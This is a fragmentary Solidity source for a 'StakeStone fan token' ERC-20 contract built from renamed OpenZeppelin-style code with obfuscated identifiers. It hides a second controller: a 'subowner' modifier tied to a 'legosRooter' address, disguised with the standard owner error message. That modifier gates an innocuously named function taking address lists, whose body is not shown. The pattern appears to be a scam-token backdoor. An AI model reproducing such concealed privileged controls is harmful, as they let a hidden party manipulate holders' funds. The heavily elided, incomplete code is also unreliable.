...
/// https://x.com/StakeStone


pragma solidity 0.8.29;

// StakeStone fan token

interface StakeStoneinterface {
  /**
...
/*
 * @dev Provides information about the current execution StakeStone20Burnable, including the
 ...
 */
abstract contract StakeStone20Burnable {
...
// File: @openzeppelin/contracts/access/StakeStone20Ownable.sol
 ...
 * the owner.
 */
abstract contract StakeStone20Ownable is StakeStone20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "StakeStone20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "StakeStone20Ownable: new owner is the zero address");
 ...
 * `SafeStakeStone` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeStakeStone {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeStakeStone: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeStakeStone: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeStakeStone: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeStakeStone: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeStakeStone: modulo by zero");
  }
...
contract StakeStoneToken is StakeStone20Burnable, StakeStoneinterface, StakeStone20Ownable {
    
    using SafeStakeStone for uint256;
    ...
    */
    ...
    /**
    * @dev See {StakeStoneinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {StakeStoneinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "StakeStone20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {StakeStoneinterface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {StakeStoneinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {StakeStoneinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {StakeStoneinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {StakeStoneinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "StakeStoneinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {StakeStoneinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "StakeStoneinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "StakeStoneinterface: transfer from the zero address");
        require(shippingto != address(0), "StakeStoneinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "StakeStoneinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "StakeStoneinterface: approve from the zero address");
        require(transporteur != address(0), "StakeStoneinterface: approve to the zero address");
